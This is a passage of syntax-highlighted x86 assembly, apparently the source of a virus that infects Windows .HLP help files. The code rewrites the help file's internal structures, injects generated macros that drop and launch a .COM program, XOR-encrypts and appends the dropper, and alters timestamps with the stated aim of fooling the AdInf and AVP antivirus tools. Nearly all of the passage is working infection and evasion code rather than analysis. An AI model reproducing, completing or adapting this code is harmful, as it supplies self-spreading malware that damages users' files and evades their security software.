        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+(</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">FILE_HEADER</span><span class="sc4">)</span><span class="sc5">.SYSTEM_HEADER_GENDATE</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0">
</span><span class="sc1">;5. GENERATE OUR MACROS</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,[</span><span class="sc8">ESI</span><span class="sc4">+</span><span class="sc8">ECX</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;BUFF4MACRO</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GEN_MACROS</span><span class="sc0">      </span><span class="sc1">;EXIT: EAX=MACROLENGTH</span><span class="sc0">
</span><span class="sc1">;6. CORRECT USED "SYSTEM" LENGTH</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESI.FILE_HEADER_USEDSPACE</span><span class="sc4">],</span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESI.FILE_HEADER_RESERVEDSPACE</span><span class="sc4">],</span><span class="sc8">EAX</span><span class="sc0">
</span><span class="sc1">;7. WRITE MACRO HEADERS+OUR MACRO IN THE END OF MODULE</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,[</span><span class="sc8">EAX</span><span class="sc4">+</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">FILE_HEADER</span><span class="sc4">+</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">SYSTEM_HEADER</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">HLP_WRITE_FILE</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">INF_EXIT</span><span class="sc0">
        </span><span class="sc6">LODSD</span><span class="sc0">               </span><span class="sc1">;FILE_HEADER_RESERVEDSPACE</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">
</span><span class="sc1">;8. REWRITE OLD "SYSTEM" DATA IN THE END OF MODULE</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">LEN_IOBUFF</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">WRITE_NEXT_BLK</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">JAE</span><span class="sc0"> </span><span class="sc5">IS_LONG_DATA</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">
</span><span class="sc5">IS_LONG_DATA</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">READ_FILE</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">EXIT_READWRITE</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">HLP_WRITE_FILE</span><span class="sc0">
</span><span class="sc5">EXIT_READWRITE</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">WAS_ERROR</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">WRITE_NEXT_BLK</span><span class="sc0">
</span><span class="sc1">;9. WRITE CORRECTED HLP_HEADER (VIA WRITE_FILE)</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc5">HLP_HEADER</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">HLP_START</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">WRITE_FILE</span><span class="sc0">      </span><span class="sc1">;ASSUME THAT EAX=0</span><span class="sc0">
</span><span class="sc1">;10. CREATE AND WRITE ENCRYPTED DROPPER IN THE END OF FILE (VIA HLP_WRITE_FILE)</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SPE_THUNK</span><span class="sc0">       </span><span class="sc1">;ECX=LENGTH OF DROPPER</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ECX</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc5">FIRST_DROP_MASK</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">ENCRYPT_HDROP</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">RELO_MASK2</span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">ENCRYPT_HDROP</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">HLP_WRITE_FILE</span><span class="sc0">
</span><span class="sc1">;11. WRITE HLP_DIRECTORY WITH CORRECTED OFFSET OF "SYSTEM" BLOCK</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc5">HLP_DIRECTORY</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc5">ESI.HLP_START_DIRECTORYSTART</span><span class="sc4">-</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">HLP_START</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">LEN_HLP_DIR</span><span class="sc0"> </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc2">0FF00H</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
</span><span class="sc5">SET_WRITE_FILE</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SET_DATE</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">WRITE_FILE</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
</span><span class="sc5">READ_FILE_BUFF_0</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">
</span><span class="sc5">READ_FILE_BUFF</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc5">MAIN_BUFF</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">SIZE_MBUFF</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">READ_FILE</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
</span><span class="sc5">ZIP_READ_FILE</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc5">ZIP_CUR_OFF</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">ZIP_CUR_OFF</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">],</span><span class="sc8">EAX</span><span class="sc0">
</span><span class="sc1">;ENTRY: EAX=POS,ECX=LENGTH,EBX=HANDLE,ESI=&amp;BUFFER4READ</span><span class="sc0">
</span><span class="sc1">;EXIT: CF=1 IF ERROR AND EAX=ERROR CODE OR EAX=(REAL BYTES READ-LENGTH)</span><span class="sc0">
</span><span class="sc5">READ_FILE</span><span class="sc0">   </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc5">R0_READFILE</span><span class="sc0">
</span><span class="sc5">GO_READ</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">FILE_IO</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">WAS_ERROR</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">
</span><span class="sc5">WAS_ERROR</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">RET</span><span class="sc0">
        </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
</span><span class="sc5">HLP_WRITE_FILE</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc5">HLP_HEADER.HLP_START_ENTIREFILESIZE</span><span class="sc4">][</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">HLP_HEADER.HLP_START_ENTIREFILESIZE</span><span class="sc4">][</span><span class="sc8">EDX</span><span class="sc4">],</span><span class="sc8">ECX</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
</span><span class="sc5">WRITE_FILE</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc5">R0_WRITEFILE</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">GO_READ</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
</span><span class="sc5">SET_DATE</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESP</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">     </span><span class="sc1">;CHANGE TIME FOR FOOLING ADINF/AVPI</span><span class="sc0">
</span><span class="sc5">SET_TIME</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_SYS_TIME</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">INF_TIME</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">],</span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;ENTRY: EDI=&amp;BUFFER FOR STORING MACROS</span><span class="sc0">
</span><span class="sc1">;EXIT: EAX=LENGTH OF MACRO</span><span class="sc0">
</span><span class="sc5">GEN_MACROS</span><span class="sc0">  </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0"> </span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc5">TEMP_EXT</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GEN_EXT</span><span class="sc0">         </span><span class="sc1">;EAX = 0</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc5">RDROP_NAME</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GEN_NAME</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc12">'MOC.'</span><span class="sc0">
        </span><span class="sc6">STOSD</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RANDOM_MSK</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RANDOM_MSK</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc12">'AA'</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc5">RUN_DROPPER</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc5">MAIN_BUFF</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">UU_MASK</span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc5">LEN_UUD</span><span class="sc0">
        </span><span class="sc6">REP</span><span class="sc0"> </span><span class="sc6">MOVSB</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc5">LEN_RDROP_CON</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EBX</span><span class="sc0">
</span><span class="sc5">UUE_BYTE</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">LODSB</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">SHR</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">BL</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0FH</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">BH</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">UUE_BYTE</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc5">RR_MACRO</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">HLP_STORE</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc5">MAIN_BUFF</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">EBP</span><span class="sc4">,</span><span class="sc8">EBP</span><span class="sc0">         </span><span class="sc1">;FIRST ITERATION</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc4">,(</span><span class="sc5">LEN_UUD</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc5">LEN_RDROP_CON</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">;LENGTH OF MACROS</span><span class="sc0">
</span><span class="sc5">NEXT_ITER</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">HLP_STORE_DROP</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">         </span><span class="sc1">;SKIP '\0'</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc5">HLP_LEN_LINE</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">JAE</span><span class="sc0"> </span><span class="sc5">NO_LAST_STR</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc8">EBX</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc8">EBX</span><span class="sc0">
</span><span class="sc5">NO_LAST_STR</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">REP</span><span class="sc0"> </span><span class="sc6">MOVSB</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc8">EBP</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EBP</span><span class="sc0">         </span><span class="sc1">;LENGTH ADDRESS</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc12">'&gt;'</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">FIRST_ITER</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
</span><span class="sc5">FIRST_ITER</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">MACRO_FNAME</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">HLP_STORE_SLEEP</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc8">EBX</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">NEXT_ITER</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">HLP_STORE_DROP</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">         </span><span class="sc1">;SKIP '\0'</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc12">' NER'</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EBP</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">MACRO_FNAME</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc12">'* '</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc12">'MOC.'</span><span class="sc0">
        </span><span class="sc6">STOSD</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">HLP_STORE_SLEEP</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc5">EXEC_MACRO_1</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">HLP_STORE</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">         </span><span class="sc1">;SKIP '\0'</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EBP</span><span class="sc0">         </span><span class="sc1">;LENGTH ADDRESS</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">MACRO_FNAME</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc5">LEN_EXEC_2</span><span class="sc0">
        </span><span class="sc6">REP</span><span class="sc0"> </span><span class="sc6">MOVSB</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CORR_LENGTH</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EDI</span><span class="sc0">         </span><span class="sc1">;LENGTH</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">
        </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
</span><span class="sc5">HLP_STORE_SLEEP</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc12">')0,"'</span><span class="sc0">
        </span><span class="sc6">STOSD</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc3">")'"</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CORR_LENGTH</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc5">SLEEP_MACRO</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">HLP_STORE</span><span class="sc0">
</span><span class="sc5">HLP_STORE_DROP</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc5">DROP_MACRO</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">HLP_STORE</span><span class="sc0">   </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">ID_CONFIG</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc5">CHK_NT</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc5">LEN_CHK_NT</span><span class="sc0">
        </span><span class="sc6">REP</span><span class="sc0"> </span><span class="sc6">MOVSB</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc5">LEN_CHK_NT</span><span class="sc0">
